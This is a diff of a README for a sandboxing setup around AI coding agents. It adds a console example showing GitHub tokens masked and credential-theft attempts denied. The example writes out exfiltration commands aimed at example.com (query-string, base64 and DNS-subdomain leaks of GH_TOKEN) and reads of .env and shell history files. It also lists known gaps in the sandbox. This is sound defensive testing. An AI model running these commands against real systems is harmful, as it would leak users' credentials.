@@ -1,6 +1,5 @@
 # AGENTS
 **"secure agentic coding infra: sandboxed automations, workflows, and conventions"**
-
 - **bounded autonomy:** danger denied, destruction gated, work unattended; bash hooks fill gaps
 - **masked credentials:** agents use tokens but can't see them; @settingsaudit catches leaks
 - **self-protecting policy:** agents can't secretly change their rules; @settingsaudit verifies guards
@@ -18,12 +17,72 @@
 
 ```
 TABLE OF CONTENTS
+├─ Example ─────── injected · masked · denied
 ├─ Installation ── basic · configured · advanced · managed
 ├─ Workflows ───── git · hooks · templates · verifying
 ├─ Conventions ─── files · wayfinders · modules · comments · code
 ├─ Conversations ─ responses · verification · errors · modes
 └─ Settings ────── sandbox · scopes · keys · rules · audits · diagnostics
 ```
+
+&nbsp;
+
+## Example: Masked Credentials
+> run /sandbox and @settingsaudit to test your credentials
+
+```console
+# ── INJECTED ────────────────────────────────────────────────────────────────────────────────────
+# unauthenticated    $ curl -o /dev/null -w "%{http_code}" https://api.github.com/user
+                     401
+# authenticated      $ curl -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/user
+                     200  "login": "MaisonDeVolonte"
+# proved identity    $ curl -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/rate_limit
+                     5000 requests/hr  (anonymous: 60)
+# ── MASKED ──────────────────────────────────────────────────────────────────────────────────────
+# shell expansion    $ echo $GH_TOKEN
+                     fake_value_5a09…kcde
+# env dump           $ env | grep -i token
+                     GH_TOKEN=fake_value_5a09…kcde
+# external binary    $ printenv GH_TOKEN
+                     fake_value_5a09…kcde
+# subprocess         $ python3 -c 'import os; print(os.environ["GH_TOKEN"])'
+                     fake_value_5a09…kcde
+# credential helper  $ gh auth token
+                     fake_value_5a09…kcde
+# dump and read      $ env > $TMPDIR/e.txt; grep TOKEN $TMPDIR/e.txt
+                     GH_TOKEN=fake_value_5a09…kcde
+# built-in export    $ export -p | grep GH_TOKEN
+                     export GH_TOKEN=fake_value_5a09…kcde
+# xtrace             $ set -x; : "$GH_TOKEN"
+                     +zsh:1> : fake_value_5a09…kcde
+# verbose transport  $ curl -v -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/user
+                     > Authorization: Bearer fake_value_5a09…kcde
+# ── DENIED ──────────────────────────────────────────────────────────────────────────────────────
+# source file        $ cat ~/.operator/.env
+                     cat: /Users/…/.operator/.env: Operation not permitted
+# network exfil      $ curl "https://example.com/?t=$GH_TOKEN"
+                     000
+# shell history      $ cat ~/.zsh_history
+                     cat: /Users/…/.zsh_history: Operation not permitted
+# encoded exfil      $ curl -d "$(echo $GH_TOKEN | base64)" https://example.com
+                     000
+# dns exfil          $ curl "https://$GH_TOKEN.example.com/"
+                     000
+# process table      $ ps eww $$
+                     operation not permitted: ps
+# harness read tool  Read(~/.operator/.env)
+                     denied by your permission settings
+```
+> caveat: go-based clis (`gh`, `terraform`, `kubectl`) cannot reach injectHosts domains on macos
+> [(#26466)](https://github.com/anthropics/claude-code/issues/26466);
+> the sandbox ca never loads and there is no supported fix since `allowMachLookup` is not passed through
+> [(#82793)](https://github.com/anthropics/claude-code/issues/82793);
+> use `curl`, node, python, or `git` (https) since injected `GIT_SSH_COMMAND` omits proxy credentials
+> [(#82255)](https://github.com/anthropics/claude-code/issues/82255);
+> the excludedCommands workaround is broken
+> [(#82109)](https://github.com/anthropics/claude-code/issues/82109)
+> and overpermissive
+> [(#81157)](https://github.com/anthropics/claude-code/issues/81157).
 
 ## Installation (Mac)
 > note: templates come preconfigured and need to be extended to your specific services
@@ -65,9 +124,10 @@ TABLE OF CONTENTS
 
 ### Git (see `AGENTS/git/`)
 > each pairs with a matching `.sh` sidecar that measures, then hands the commands back
+> the exception is `@gitcontinue`, whose sync runs against four narrow allows in the deny floor
 - [@gitaudit](AGENTS/git/gitaudit.md): diagnostics, triage, report, summary, tasks (saved to file)
 - [@gitbrutal](AGENTS/git/gitbrutal.md): brutally honest code review, progress report (saved to file)
-- [@gitcontinue](AGENTS/git/gitcontinue.md): measures the trunk delta, hands over the sync
+- [@gitcontinue](AGENTS/git/gitcontinue.md): measures the trunk delta, then runs the sync it planned
 - [@gitdeliver](AGENTS/git/gitdeliver.md): buckets changes atomically, hands over each delivery block
 - [@gitempty](AGENTS/git/gitempty.md): prunes tracking refs, hands over the trunk sync and branch deletes
 - [@gitfresh](AGENTS/git/gitfresh.md): prices a hard reset, hands over backup then reset
